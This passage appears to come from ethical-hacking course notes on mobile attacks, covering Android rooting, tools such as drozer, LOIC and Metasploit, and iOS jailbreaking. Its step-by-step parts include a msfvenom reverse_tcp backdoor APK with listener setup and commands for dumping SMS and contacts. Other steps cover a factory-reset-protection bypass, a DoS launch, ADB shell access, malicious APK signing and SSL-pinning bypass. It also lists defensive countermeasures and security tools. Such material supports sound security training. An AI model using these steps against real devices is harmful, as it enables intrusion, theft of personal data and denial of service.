				- Disable camera: Allows administrators to disable the device camera. This restriction is not necessarily permanent—administrators can dynamically enable or disable the camera based on context, time, or other conditions. (Introduced in Android 4.0)
			- Additional Features of the Device Administration API:
				- In addition to the policies listed above, the API allows administrators to:
					- Prompt users to set a new password
					- Lock the device immediately
					- Wipe all data from the device (restore it to factory defaults)
	- Android Rooting:
		- Rooting an Android device allows users to bypass restrictions imposed by hardware manufacturers and carriers, enabling them to modify or replace system applications and settings, run apps that require administrative privileges, remove pre-installed applications, and even replace the device’s operating system. Rooting grants users privileged control (known as “root access”) within Android’s subsystem. The process typically involves exploiting security vulnerabilities in the device’s firmware, copying the su binary to a location within the system’s PATH (e.g., /system/xbin/su), and granting it executable permissions using the chmod command.
		- Rooting enables users to perform advanced operations, such as:
			- Modifying or deleting system files, modules, ROMs (stock firmware), and kernels
			- Removing carrier- or manufacturer-installed applications (bloatware)
			- Gaining low-level access to hardware that is typically restricted in default configurations
			- Enhancing device performance
			- Enabling Wi-Fi and Bluetooth tethering
			- Installing applications on an SD card
			- Customizing the user interface and keyboard
		- However, rooting also comes with significant risks, including:
			- Voiding the phone’s warranty
			- Reduced device performance
			- Increased vulnerability to malware
			- Risk of "bricking" the device (rendering it unusable)
		- Popular tools for rooting Android devices include One Click Root, KingoRoot, and others.
		- Android Rooting Tools:
			- Rooting Android Using KingoRoot (www.kingoapp.com):
				- KingoRoot is a tool used to root Android devices, and it can be used with or without a PC. Rooting with KingoRoot allows users to:
					- Extend battery life
					- Access root-only apps
					- Remove carrier-installed “bloatware”
					- Customize the device’s appearance
					- Gain administrative (root) permissions
				- Rooting an Android Device Using KingoRoot with a PC:
					- Download and install KingoRoot Android (PC Version) on your computer.
					- Launch the tool and connect your Android device to the computer using a USB cable.
					- Enable USB debugging mode on your Android device.
					- The tool will automatically install the necessary drivers on your PC.
					- Once the device is detected, a new screen will display your device name along with a “ROOT” button.
					- Click “ROOT” to begin the rooting process.
				- Rooting an Android Device Using KingoRoot without a PC:
					- Enable installation from unknown sources in your Android device settings.
					- Download KingoRoot.apk from the official website.
					- Install and open the KingoRoot app.
					- Tap “One Click Root” on the main interface.
					- Wait a few seconds for the rooting process to complete.
					- If rooting fails, try multiple attempts or use the PC version instead.
			- One Click Root (oneclickroot.com):
				- One Click Root is an Android rooting software that supports a wide range of devices. It includes additional fail-safes, such as instant unrooting, and offers full technical support. With One Click Root, users can root their Android smartphones or tablets to unlock various features, including:
					- Access to more apps
					- Installing apps on an SD card
					- Extending battery life
					- Enabling Wi-Fi and Bluetooth tethering
					- Installing custom ROMs
					- Unlocking blocked features
				- Steps to Root an Android Device Using One Click Root:
					- Download and install One Click Root (PC Version) on your computer.
					- Connect your Android device to the computer using a USB cable.
					- Enable USB debugging mode on your Android device.
					- Launch the One Click Root tool on your PC.
					- Click “ROOT” to begin the rooting process.
			- TunesGo (tunesgo.wondershare.com)
			- RootMaster (root-master.com)
			- Magisk Manager (magiskmanager.com)
			- KingRoot (kingrootapp.net)
			- iRoot (iroot-download.com)
	- Hacking Android Devices:
		- Due to the rapidly growing number of Android users, these devices have become primary targets for hackers. Attackers utilize various tools, such as Drozer, zANTI, Network Spoofer, Low Orbit Ion Cannon (LOIC), DroidSheep, and Orbot Proxy, to launch attacks on Android devices.
		- Identifying Attack Surfaces Using drozer:
			- Attackers use the drozer tool to discover various vulnerabilities and attack surfaces on Android devices and applications. It also includes features that allow control over remote Android devices. Attackers do not require USB debugging techniques; they can assess the device using drozer even in a production environment. This tool provides a drozer agent (an emulator used for testing) and a drozer console (a command-line interface) that attackers can leverage to perform various assessment operations on target devices.
			- After installing the drozer agent, follow the steps below to identify attack surfaces on a target Android device:
			- Fetching Package Information:
				- Use the following commands to retrieve package information from a connected device:
					- Displays all installed packages on the device: dz> run app.package.list
					- Retrieves package names that match the given string: dz> run app.package.list -f <string_name>
					- Retrieves basic details about a specific package: dz> run app.package.info -a <package_name>
				- Running these commands provides the attacker with all necessary information about the targeted package.
			- Identifying Attack Surfaces:
				- Once the attacker has obtained package details, they can use utilities from drozer to identify attack surfaces on the device. The following commands list information about exported activities, services, broadcast receivers, and content providers:
					- Lists various exported activities: dz> run app.package.attacksurface <package_name>
					- Displays details of the exported activities: dz> run app.activity.info -a <package_name>
			- Launching Activities:
				- Use the following command to launch a required activity: dz> run app.activity.start --component <package_name> <activity_name>
				- The launched activity may expose critical information, which can be exploited to bypass authentication mechanisms.
				- After bypassing authentication, the attacker can discover additional attack surfaces and further exploit them to carry out attacks on target Android devices.
		- Bypassing FRP on Android Phones Using 4uKey (www.tenorshare.net):
			- Factory Reset Protection (FRP) is a security feature on Android devices designed to prevent unauthorized access to lost or stolen phones. However, some users attempt to bypass FRP using software tools like 4uKey or Octoplus FRP. Successfully bypassing FRP allows access to personal data stored on the device, including contacts, messages, and photos. Additionally, compromised devices could be used to install malware or access sensitive accounts.
			- Below are the steps to bypass FRP on Android phones using 4uKey:
				- Launch 4uKey and connect the locked Android device to a computer. Click on "Remove Google Lock (FRP)".
				- Select the correct Android OS version for the device.
				- Click "Start" to begin the FRP removal process.
				- Follow the on-screen instructions to complete the bypass.
					- If a pop-up appears on your device, enable "Always Allow from This Computer" and select "OK" or "Allow" before proceeding.
				- Once the process is complete, a confirmation message will appear: "Bypassed Google FRP Lock Successfully."
		- Hacking with zANTI and Kali NetHunter:
			- Hacking Networks Using zANTI (www.zimperium.com):
				- zANTI is an Android application that allows you to perform various network attacks, including:
					- Spoofing MAC addresses
					- Creating a malicious Wi-Fi hotspot to capture victims' traffic, allowing control and hijacking
					- Scanning for open ports
					- Exploiting router vulnerabilities
					- Conducting password complexity audits
					- Performing MITM (Man-in-the-Middle) and DoS (Denial-of-Service) attacks
					- Viewing, modifying, and redirecting HTTP requests and responses
					- Redirecting HTTPS to HTTP or rerouting HTTP requests to a specific IP or web page
					- Injecting HTML code into web pages
					- Hijacking sessions
					- Viewing and replacing all images transmitted over the network
					- Capturing and intercepting downloads
			- Hacking Networks Using Kali NetHunter (www.kali.org):
				- Kali NetHunter offers a comprehensive suite of tools that enable attackers to conduct various cyber attacks, including:
					- Human Interface Device (HID) keyboard attacks
					- BadUSB attacks
					- Evil AP MANA attacks on Android devices
				- Additionally, Kali NetHunter allows attackers to generate custom payloads using Metasploit to compromise target networks. Users can simply select a payload, configure the necessary options, and generate a suitable exploit.
		- Launching DoS Attack Using Low Orbit Ion Cannon (LOIC):
			- LOIC is a mobile application that enables users to conduct DoS/DDoS attacks on a target IP address. This application can perform UDP, HTTP, or TCP flood attacks. It allows users to control traffic flow, send data packets to any IP address, utilize different attack methods (HTTP, UDP, or TCP), retrieve an IP address from a given web address, and send packets to a specified port.
			- Steps to Launch DoS Attack:
				- Download and install the LOIC Android application from the Google Play Store.
				- Open the LOIC application.
				- Enter the target IP address or URL in the "GET Target IP" field and click the "GET IP" button.
				- Select the desired attack method by choosing one of the UDP, HTTP, or TCP radio buttons under the "Send Method" option.
				- Specify the port number and the number of threads. Both values must be positive whole numbers.
				- Click the "START" button at the bottom of the interface to initiate the DoS attack.
		- Hacking with Orbot Proxy (orbot.app):
			- Orbot is a proxy app that enhances privacy by allowing other applications to access the Internet securely. It uses the Tor network to encrypt Internet traffic and anonymize connections by routing them through a series of servers worldwide. While Orbot is designed for privacy and security, malicious actors may exploit it to conceal their identity while conducting cyberattacks or accessing target web applications.
		- Exploiting an Android Device through ADB Using PhoneSploit Pro (github.com):
			- Android Debug Bridge (ADB) is a command-line tool that allows attackers to communicate with a target Android device. This tool provides various features, such as installing and debugging apps and accessing the Unix shell to execute commands on the device. ADB can be connected via a USB cable or wirelessly. To use ADB wirelessly, the daemon server must be enabled on the target device using TCP port 5555.
			- ADB acts as a bridge between the attacker’s PC and the target Android device, providing a command window to execute commands directly on the device. If the target device has TCP debugging enabled on port 5555, attackers can leverage tools like PhoneSploit Pro to perform various malicious activities, including screen capture, system information extraction, viewing running applications, port forwarding, installing/uninstalling apps, and toggling Wi-Fi on or off.
		- Launching a Man-in-the-Disk (MITD) Attack:
			- A man-in-the-disk (MITD) attack occurs when applications fail to implement proper security measures while using a device’s external storage. This vulnerability can lead to the installation of potentially malicious apps on the user’s device, blocking access to legitimate applications. MITD is a variation of a man-in-the-middle (MITM) attack.
			- The Android OS has two types of storage: internal and external. Internal storage is sandboxed, restricting access to the app that owns it, whereas external storage is designed for file sharing between apps, making it more susceptible to MITD attacks.
			- During a routine update, a legitimate app may store update files on external storage. An attacker monitors and manipulates this data, replacing or tampering with the update’s source code. Once the malicious code is injected into the update, the app unknowingly fetches and executes the altered code, installing a fraudulent application from the attacker.
			- By using this malicious app, the attacker can bypass Android’s security mechanisms and gain access to sensitive information stored on the device, such as login credentials, personal information, contacts, and photos. In some cases, the attacker may even compromise hardware components such as microphones and cameras. The malicious app may also cause system crashes or gain full control of the device.
			- Steps of an MITD Attack:
				- The victim downloads and installs a legitimate app from an official app store.
				- The victim’s device receives an app update and requests a code update from a cloud server.
				- The victim grants permission for the legitimate app to access external storage, where the update files are stored.
				- The attacker monitors the external storage and injects malicious code into the update files.
				- The legitimate app fetches and executes the tampered update code from external storage.
				- The malicious code triggers the installation of a fraudulent app from the attacker.
				- Using this fraudulent app, the attacker can steal sensitive information or gain full control of the mobile device.
		- Launching Spearphone Attack:
			- A spearphone attack enables Android apps to record loudspeaker audio without requiring special permissions. Attackers can eavesdrop on voice conversations between remote mobile users by exploiting a hardware-based motion sensor, specifically the accelerometer.
			- The accelerometer is a firmware chip embedded in most smartphones that detects changes in position and velocity. Since this sensor can be accessed by any installed app without special permissions, it poses a security risk. Because the loudspeaker and accelerometer share the same surface within the device, speech vibrations from the loudspeaker can be detected and recorded by the motion sensor.
			- Attackers can leverage a malicious app to monitor loudspeaker output, capturing sensitive audio data such as voice assistant responses, multimedia messages, and audio files. Additionally, they can process this data using speech recognition and reconstruction techniques to identify speakers, classify gender, and analyze conversations—compromising users' speech privacy.
		- Exploiting Android Devices Using Metasploit:
			- The Metasploit Framework allows attackers to use custom or built-in exploits and payloads to compromise a target Android device and obtain sensitive information.
			- Steps to Exploit an Android Device Using Metasploit:
				- View Available Android Exploits and Payloads:
					- Run the following commands to list Android-specific exploits and payloads:
						- msf > search type:exploit platform:android
						- msf > search type:payload platform:android
				- Generate a Custom Payload:
					- Use msfvenom to create a malicious APK file: msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<Local Host IP Address> LPORT=<Port No> -o Desktop/Backdoor.apk
					- Note: A listener must be opened on the system to establish a connection once the APK file is executed on the target device.
				- Set Up a Listener on the Attacking Machine:
					- Run the following commands in Metasploit to enable communication with the target device:
						- msf > use exploit/multi/handler
						- msf > set PAYLOAD android/meterpreter/reverse_tcp
						- msf > set LHOST <Local Host IP Address>
						- msf > set LPORT <Port No>
						- msf > exploit
				- Verify the Connection:
					- After successfully compromising the target device, check its system information using: meterpreter > sysinfo
				- Gather Sensitive Data:
					- Use the following Meterpreter commands to extract data from the target device:
						- View network configuration: meterpreter > ipconfig
						- Display current directory: meterpreter > pwd
						- List running processes: meterpreter > ps
						- Extract SMS messages: meterpreter > dump_sms
						- Retrieve call logs: meterpreter > dump_calllog
						- Export saved contacts: meterpreter > dump_contacts
						- List available webcams: meterpreter > webcam_list
		- Analyzing Android Devices (OWASP MAS - mas.owasp.org):
			- Analyzing Android devices involves examining the system to gather information, understand behavior, or identify vulnerabilities for various purposes. An attacker can analyze a targeted Android device by connecting it to their workstation and gaining shell access using the ADB command-line tool.
			- Below are some of the tasks an attacker can perform while analyzing a connected Android device:
				- Accessing the Android Device Through Shell:
					- This technique allows an attacker to connect to an Android device over Wi-Fi instead of using a USB cable. It requires both the attacker’s machine and the target Android device to be on the same Wi-Fi network.
					- The following steps outline this attack:
						- Connect the Android device to the attacker's computer using a USB cable.
						- Enable TCP/IP connections on port 5555 by running: adb tcpip 5555
						- Disconnect the USB cable, then connect to the Android device over Wi-Fi using: adb connect <device_ip_address>
						- Verify the connection by executing: adb devices
						- Open a shell on the device: adb shell
					- This technique assumes that the target device has Developer Mode and USB Debugging enabled.
				- Enumerating Installed Applications:
					- Once connected, an attacker can enumerate installed applications using ADB commands.
					- To list all installed applications: adb shell pm list packages
					- To list only third-party applications: adb shell pm list packages -3 -f
					- Using the Frida tool to list installed applications: frida-ps -Uai
						-a: All apps
						-i: Currently installed
						-U: Connected USB device
				- Disassembling a Targeted App Package:
					- Attackers can disassemble an app package using apktool, which decodes AndroidManifest.xml and other files.
					- To unpack an APK file:
						- apktool d <App_package>.apk
						- tree
					- This command extracts files such as AndroidManifest.xml, META-INF, assets, classes.dex, lib, res, and resources.arsc.
				- Monitoring Logs:
					- Attackers can capture logs from a targeted Android device using the logcat command.
					- To store logs in a .log file: adb logcat > logcat.log
				- Listing Open Files:
					- To list open files for a specific process ID (pid), attackers can use: lsof -p <pid>
				- Listing Open Connections:
					- To check network activity for a specific process ID: netstat -p | grep <pid>
				- Signing and Installing Malicious APKs:
					- Attackers can sign malicious or repackaged APK files using a custom code-signing certificate.
					- Generate a debug keystore (creates custom debug.keystore code-signing certificate): keytool -genkey -v -keystore ~/.android/debug.keystore -alias signkey -keyalg RSA -keysize 2048 -validity 20000
					- Sign the malicious APK file with custom code-signing certificate using apksigner: apksigner sign --ks ~/.android/debug.keystore --ks-key-alias signkey <malicious file>.apk
					- This process ensures that a modified APK can be installed on an Android device.
		- Advanced SMS Phishing:
			- An advanced SMS phishing attack is a type of phishing scam that exploits security vulnerabilities in the latest Android-based smartphones, primarily those manufactured by Samsung, Huawei, LG, and Sony. Attackers can execute this attack using a low-cost USB modem and deceive users into accepting new, malicious settings on their mobile devices. These settings can redirect the user's data to the attacker.
			- The attack vector relies on a process called Over-the-Air (OTA) provisioning, which network operators commonly use to send provisioning data and updates to mobile devices remotely. Due to weak authentication methods, OTA is highly susceptible to phishing attacks. In this attack, the attacker sends messages that appear to be from a legitimate network operator. These messages contain malicious links that, when clicked, redirect internet traffic to the attacker.
			- Before carrying out the attack, the attacker needs the victim's International Mobile Subscriber Identity (IMSI) number—a unique identifier assigned to every mobile device. With access to the IMSI, the attacker can ensure their malicious message is authenticated and processed by the victim's device. If the IMSI number is unavailable, the attacker must send two messages:
				- The first message contains a PIN that appears to come from the victim’s network operator.
				- The second message includes the malicious content, authenticated using the PIN from the first message.
			- Once the victim enters the PIN, their mobile device is compromised. These phishing messages can alter message servers, mail servers, directory servers, and proxy addresses on Android-based smartphones.
			- SMiShing attacks can be mitigated using security applications such as Harmony Mobile.
		- Bypassing SSL Pinning:
			- SSL pinning ensures that applications communicate only after validating trusted certificates and public keys. While it helps prevent MITM (Man-in-the-Middle) attacks, attackers can still bypass SSL pinning by exploiting misconfigurations in its implementation using various techniques.
			- These techniques include reverse engineering, hooking, and automated tools such as Apktool, Frida, Keytool, and Jarsigner.
			- Reverse Engineering:
				- Attackers use tools like Apktool to decompile and recompile an application after modifying its code.
				- Steps to Bypass SSL Pinning Using Reverse Engineering:
					- Download and install Apktool (a command-line tool for decompiling and recompiling Android applications).
					- Decompile the Android application using the following command: apktool d <application_name.apk>
					- After decompilation, you gain access to the APK source code, including directories such as smali, build, smali_classes, assets, lib, unknown, original, and res.
					- The smali directory contains the application's assembly code, including pre-installed Kotlin and Java code. Understanding this code is essential for modifying SSL pinning mechanisms.
					- Locate functions like checkClientTrusted and checkServerTrusted, which validate X.509 digital certificates. These certificates contain the public key's bytecode. By modifying the output of these functions, you can bypass SSL pinning.
					- Recompile the modified application using the following command: apktool b <application_directory_name>
			- Hooking:
				- The hooking technique allows attackers to tamper with an application’s runtime behavior. Tools like Frida enable attackers to inject malicious code, manipulate the application's original code, and bypass SSL pinning dynamically.
				- To hook JavaScript code into a running Android application using Frida, use the following command: frida -U -l <hooking_file.js> -f <package_name>
				- Note: Frida can also be used to perform hooking on iOS applications.
		- Tap ’n Ghost Attack:
			- Tap ’n Ghost is an advanced attack technique that exploits NFC-enabled Android devices. This attack specifically targets NFC technology and RX electrodes in the capacitive touchscreens of mobile devices. If an attacker establishes a remote connection with the target device, they can gain full control over it. Attackers typically use Bluetooth or Wi-Fi access points to create this remote connection.
			- Tap ’n Ghost relies on two primary attack techniques: Tag-based Adaptive Ploy (TAP) and Ghost Touch Generator. By leveraging these methods, attackers can generate malicious events on a victim’s smartphone and remotely take control. This type of attack can also be executed on other devices, such as voting machines and ATMs.
			- Tag-based Adaptive Ploy (TAP):
				- TAP exploits the NFC feature to trigger an Android device to visit a specific URL without the victim’s consent. This is achieved using an NFC tag emulator, which works in conjunction with a web server that employs device fingerprinting techniques.
			- Ghost Touch Generator:
				- Ghost Touch Generator manipulates touch inputs to deceive the victim. It forces the victim to interact with a seemingly harmless cancel button, which, in reality, functions as a confirmation or permission button. As a result, the attacker can trick the victim into unknowingly granting remote access to their smartphone.
		- Android Malware:
			- Mamont (www.gdatasoftware.com):
				- Mamont is an Android banking Trojan that masquerades as a Chrome browser application, deceiving users into unwittingly downloading and installing it. This type of malware is typically distributed via phishing emails and spam messages.
				- Upon installation, the Trojan activates and prompts the user to grant specific permissions, including the ability to initiate and oversee phone calls, as well as send and receive SMS messages. It then tricks the user into believing they have won a cash prize, prompting them to input personal information such as phone numbers and credit card details.
				- Additionally, the malware advises the user not to uninstall the app for 24 hours to claim the fake prize money. By employing this strategy, the Trojan prolongs its presence on the device, continuously extracting sensitive information.
			- SecuriDropper
			- Dwphon
			- DogeRAT
			- Tambir
			- SoumniBot
		- Android Hacking Tools:
			- Attackers use various Android hacking tools to identify vulnerabilities and exploit target mobile devices to obtain critical user information, such as credentials, personal data, and contact lists.
			- AndroRAT:
				- AndroRAT is a tool designed to provide remote control over an Android system and retrieve information from it. It operates as a client-server application, with the client side developed in Java for Android and the server side in Python. AndroRAT establishes a persistent backdoor on the target device, automatically launching upon device boot-up. It can obtain details such as the device's current location, SIM card information, IP address, and MAC address.
			- Ghost Framework:
				- Ghost Framework is an Android post-exploitation tool that utilizes the Android Debug Bridge (ADB) to gain remote access to Android devices. This allows attackers to access the device shell without relying on OpenSSH or other protocols. The tool supports port forwarding and enables data extraction, including device logs, installed apps, MAC/INET addresses, battery status, network status, and current activity.
				- Attackers can use Ghost Framework to:
					- Install, uninstall, or run apps on a target device
					- Extract APK files from installed apps
					- Remove device passwords
					- Record the device screen or take screenshots
					- Extract files from the device
					- Emulate button presses
					- Manage Wi-Fi settings
					- Extract WPA_supplicant files
					- Shut down the device
			- hxp_photo_eye (github.com)
			- Gallery Eye (github.com)
			- mSpy (www.mspy.com)
			- Hackingtoolkit (github.com)
			- Social-Engineer Toolkit (SET) (github.com)
		- Android-based Sniffers:
			- PCAPdroid (play.google.com): PCAPdroid is an open-source application that allows users to monitor, analyze, and capture network traffic on Android devices. It simulates a VPN to intercept network connections without requiring root access. Additionally, PCAPdroid processes all data locally on the device, eliminating the need for a remote server.
			- NetCapture (play.google.com)
			- Intercepter-NG (http://sniff.su)
			- Packet Capture (play.google.com)
			- Sniffer Wicap 2 Demo (www.9apps.com)
			- Reqable API Testing & Capture (play.google.com)
	- Securing Android Devices:
		- Follow these countermeasures to protect your Android device and data from malicious users:
			- Access & Authentication:
				- Enable a strong screen lock (PIN, password, or pattern).
				- Use biometric authentication (fingerprint or facial recognition).
				- Enable two-factor authentication (2FA) on your device and accounts.
				- Use a password manager like LastPass to store credentials securely.
			- App & Software Security:
				- Download apps only from official sources like Google Play.
				- Review app permissions, ratings, and comments before installing.
				- Keep your OS and security patches updated.
				- Use Android security apps like Google Play Protect or Lookout Mobile Security.
				- Avoid downloading APKs from unknown sources.
				- Uninstall apps that compromise privacy.
			- Data & Network Protection:
				- Encrypt your device and internet traffic using VPNs like ExpressVPN.
				- Lock sensitive apps using tools like AppLock.
				- Back up important data to the cloud.
				- Restrict file transfers to untrusted devices.
				- Minimize personal information shared with apps.
			- Device & Connection Security:
				- Turn off Bluetooth, NFC, and USB debugging when not in use.
				- Disable SmartLock and auto sign-in features.
				- Enable GPS tracking for lost or stolen devices.
				- Use remote wipe tools like Google Find My Device.
			- Additional Measures:
				- Disable “Visible Passwords” to prevent exposure.
				- Turn off unnecessary Wi-Fi connections.
				- Regularly review app activity and device logs for suspicious behavior.
			- Ensure long-term Android security patch support before purchasing a device.
		- Android Security Tools:
			- Kaspersky Antivirus for Android (www.kaspersky.com): Kaspersky Antivirus for Android is a security app designed to protect mobile devices and tablets from theft, viruses, and malware. It helps users locate their device if lost or stolen while offering robust protection against cyber threats. Key features include antivirus protection, background checks, app locking, anti-theft tools, and anti-phishing safeguards.
			- Avira Security Antivirus & VPN (play.google.com)
			- Avast Antivirus & Security (play.google.com)
			- McAfee Security: Antivirus VPN (play.google.com)
			- Lookout Mobile Security and Antivirus (play.google.com)
			- Sophos Intercept X for Mobile (play.google.com)
		- Android Device Tracking Tools:
			- Android device tracking tools help you locate your Android device if it is lost, stolen, or misplaced. However, attackers may also misuse these tools to track the location of target mobile devices. Below are some widely used Android device tracking tools:
			- Google Find My Device (www.google.com):
				- Google Find My Device allows you to easily locate your lost Android device while keeping your information secure. It also provides an option to erase the data on a lost or stolen device.
				- If users have Google Sync installed on a supported mobile device (including Android) with the Google Apps Device Policy app, they can use the Google Apps control panel to remotely locate, lock, or erase their lost Android device. When a device is lost or stolen, users can select this service to erase all data and perform a factory reset. This process removes all data from the device (including the SD card, if applicable), such as emails, calendars, contacts, photos, music, and personal files.
				- Requirements to use Find My Device:
					- Your lost device must:
					- Be turned on
					- Be signed in to a Google Account
					- Be connected to mobile data or Wi-Fi
					- Be visible on Google Play
					- Have Location turned on
					- Have Find My Device enabled
				- How to find, lock, or erase a lost or stolen device:
					- Go to Find My Device and sign in to your Google Account.
					- If you have multiple devices, select the lost device at the top of the screen.
					- The device will receive a notification.
					- On the map, check the device’s location.
						- The location is approximate and may not be entirely accurate.
						- If the device cannot be found, its last known location (if available) will be displayed.
					- Choose an action:
						- Play Sound: Rings the device at full volume for 5 minutes, even if set to silent or vibrate.
						- Secure Device: Locks the device with your PIN, pattern, or password. If no lock is set, you can create one. You can also add a message or phone number to the lock screen to help someone return the device.
						- Factory Reset Device: Permanently erases all data on the device (but may not remove SD card data). After this, Find My Device will no longer function on the device.
			- Find My Phone (play.google.com):
				- Find My Phone is an anti-theft device recovery app for Android that helps locate lost, stolen, or misplaced mobile phones and tablets.
			- Where’s My Droid (wheresmydroid.com):
				- Where’s My Droid is an Android tracking tool that allows you to locate your phone remotely. You can trigger tracking by sending a text message with an attention word or by using the online control center, Commander.
			- Prey: Find My Phone & Security (play.google.com)
			- Phone Tracker and GPS Location (play.google.com)
			- Mobile Tracker for Android (play.google.com)
			- Lost Phone Tracker (play.google.com)
			- Phone Tracker By Number (play.google.com)
		- Android Vulnerability Scanners:
			- Quixxi App Shield (quixxi.com): Quixxi App Shield is designed for enterprises and mobile app developers to protect their applications from piracy, revenue loss, intellectual property (IP) theft, user data breaches, hacking, and tampering. It features a multi-layered encryption engine that prevents reverse engineering and unauthorized modifications, ensuring comprehensive security for mobile applications.
			- Android Exploits (play.google.com)
			- ImmuniWeb® MobileSuite (www.immuniweb.com)
			- Yaazhini (www.vegabird.com)
			- Vulners Scanner (play.google.com)
		- Static Analysis of Android APKs:
			- Security analysts perform static analysis on malicious Android APKs to examine their code without executing the app. This method helps identify harmful features such as data exfiltration, spying, or unauthorized system modifications. It also reveals vulnerabilities like weak coding practices, embedded passwords, and outdated libraries that attackers can exploit. Additionally, static analysis allows analysts to compare suspicious APK code with known malware signatures to detect malware variants.
			- Static Analysis of Android APKs Using Mobile Security Framework (MobSF):
				- Security analysts can use the Mobile Security Framework (MobSF) to perform both static and dynamic analyses of suspected Android APK files.
				- MobSF (github.com):
					- MobSF is a multipurpose tool that automates malware analysis and security assessment using both static and dynamic analysis techniques.
					- It supports various mobile app binaries, including APK, XAPK, APPX, and IPA files.
					- Security analysts can use MobSF to extract key information such as app permissions, browsable activities, and signer certificates to detect malicious app behavior.
					- Steps to Perform Static Analysis Using MobSF:
						- Open a web browser and visit MobSF Live.
						- Upload the suspicious APK file by clicking the "Upload & Analyze" button to initiate the static analysis.
						- Once the analysis is complete, the tool displays details such as the application hash sum, component types, and various statistics on the dashboard.
						- Click on "PDF Report" or "Print Report" to download a comprehensive APK analysis report.
				- Online Android Analyzers:
					- Online Android analyzers help scan APK files and perform security assessments to detect vulnerabilities in applications.
					- Sixo Online APK Analyzer (sisik.eu):
						- The Sixo Online APK Analyzer allows users to analyze various aspects of APK files.
						- It can decompile binary XML files and extract important resources for further security evaluation.
					- ShenmeApp (www.shenmeapp.com)
					- KOODOUS (koodous.com)
					- Android Apk decompiler (www.javadecompilers.com)
					- Hybrid Analysis (www.hybrid-analysis.com)
					- DeGuard (apk-deguard.com)
- Hacking iOS:
	- iOS is a mobile operating system developed by Apple. The company does not license iOS for installation on non-Apple hardware. Over time, Apple has expanded its product lineup to include mobile phones, tablets, and other mobile devices. The growing popularity of Apple devices has attracted the attention of attackers. Design flaws in iOS make it vulnerable to malicious apps, hidden network profiles, man-in-the-middle (MITM) attacks, and more. Attackers may exploit these vulnerabilities to gain root-level access to Apple devices.
	- This section covers the following topics: an introduction to Apple iOS, jailbreaking iOS, types of jailbreaking, jailbreaking tools and techniques, guidelines for securing iOS devices, and iOS device tracking tools.
	- Apple iOS:
		- iOS is Apple’s mobile operating system, supporting devices such as the iPhone, iPod touch, iPad, and Apple TV. It manages device hardware and provides various technologies required to develop native apps. At the highest level, iOS acts as an intermediary between applications and the underlying hardware. Apps interact with the hardware through a set of well-defined system interfaces.
		- The user interface (UI) is based on direct manipulation, utilizing multi-touch gestures. The iOS architecture consists of five layers: Cocoa Application, Media, Core Services, Core OS, and Kernel & Device Drivers. The lower layers provide fundamental services and technologies, while the higher layers build upon them to offer more advanced features.
		- iOS Architecture Layers:
			- Cocoa Application: This layer includes essential frameworks for building iOS apps. These frameworks define the app's appearance, provide basic infrastructure, and support key technologies such as multitasking, touch-based input, push notifications, and high-level system services. Cocoa apps primarily use the UIKit framework (not AppKit, which is for macOS).
			- Media: This layer provides graphics, audio, and video technologies that enable rich multimedia experiences in applications.
			- Core Services: This layer includes fundamental system services essential for app functionality. Key services include the Core Foundation and Foundation frameworks, which define basic data types used by all apps. Technologies supporting features such as social media integration, iCloud, location services, and networking also reside in this layer.
			- Core OS: This layer provides low-level functionalities on which most other technologies rely. Frameworks in this layer handle security, external hardware communication, and network connectivity. The services in this layer depend on the Kernel & Device Drivers layer.
			- Kernel & Device Drivers: The lowest layer of the iOS architecture includes the kernel, device drivers, BSD (Berkeley Software Distribution), file systems, and core infrastructure technologies such as networking.
	- Jailbreaking iOS:
		- Jailbreaking is the process of installing modified kernel patches that allow users to run third-party applications not signed by the OS vendor. It bypasses Apple's built-in restrictions, enabling modifications to the operating system, administrative privileges, and the installation of unofficial apps via “sideloading.” Jailbreaking is achieved by modifying the iOS system kernels.
		- One of the main reasons for jailbreaking iOS devices such as the iPhone, iPad, and iPod Touch is to unlock features restricted by Apple and its App Store. Jailbreaking provides root access to the operating system, allowing users to download third-party applications, themes, and extensions that are unavailable through the official Apple App Store. However, jailbreaking also removes sandbox restrictions, which can expose devices to security risks, including malicious apps gaining access to restricted system resources and sensitive information.
		- Various tools can be used to jailbreak iOS devices, including Hexxa Plus, Sileem, checkra1n, palera1n, and Redensa.
		- Risks of Jailbreaking:
			- Like rooting an Android device, jailbreaking carries several security and performance risks, such as:
				- Voiding the device’s warranty: Apple does not support jailbroken devices, which may lead to denied repairs or service.
				- Poor performance: Jailbroken devices may experience system instability, crashes, or decreased battery life.
				- Malware infection: Bypassing security measures increases the risk of downloading malicious software.
				- “Bricking” the device: A failed jailbreak attempt can render the device unusable.
		- Types of Jailbreaking:
			- There are three main types of jailbreaking, as discussed below:
			- Userland Exploit:
				- A Userland Exploit takes advantage of vulnerabilities in system applications, granting user-level access but not iBoot-level access. Since this exploit operates within user-mode, it does not cause a recovery mode loop, making it impossible to secure iOS devices against it. The only way to patch this vulnerability is through firmware updates.
			- iBoot Exploit:
				- An iBoot Exploit can be semi-tethered if the device has a newer bootrom. This type of jailbreak provides both user-level and iBoot-level access by exploiting a vulnerability in iBoot (the device’s third-stage bootloader). It bypasses the code-signing mechanism, allowing unauthorized modifications. However, firmware updates can patch these exploits.
			- Bootrom Exploit:
				- A Bootrom Exploit targets SecureROM (the device’s first-stage bootloader), exploiting a vulnerability that disables signature checks. This allows the loading of patched NOR firmware. Unlike other exploits, firmware updates cannot patch a Bootrom Exploit—only a hardware update by Apple can fix it. A bootrom jailbreak provides both user-level and iBoot-level access, making it one of the most persistent jailbreak methods.
		- Jailbreaking Techniques:
			- Untethered Jailbreaking:
				- An untethered jailbreak allows the device to restart normally while remaining jailbroken. When the device is turned off and back on, the kernel is automatically patched without requiring a computer, ensuring the jailbreak persists after every reboot.
			- Semi-Tethered Jailbreaking:
				- In a semi-tethered jailbreak, if the device is turned off and restarted, it will boot up normally but without a patched kernel. The device remains usable for regular functions, but jailbroken features and tweaks will not work until the user reactivates the jailbreak using a jailbreaking tool on a computer.
			- Tethered Jailbreaking:
				- A tethered jailbreak requires a computer every time the device is restarted. If the device is turned off and then back on without using a jailbreaking tool, it may get stuck in a partially booted state. To fully restart the device with a patched kernel, the user must reconnect it to a computer and use the "boot tethered" feature of a jailbreaking tool.
			- Semi-Untethered Jailbreaking:
				- A semi-untethered jailbreak is similar to a semi-tethered jailbreak. When the device reboots, the kernel is not patched, and the jailbreak is temporarily disabled. However, instead of requiring a computer to reactivate the jailbreak, the user can restore it using an app installed on the device.
		- Jailbreaking Tools:
			- Jailbreaking iOS Using Hexxa Plus (hexxaplus.com):
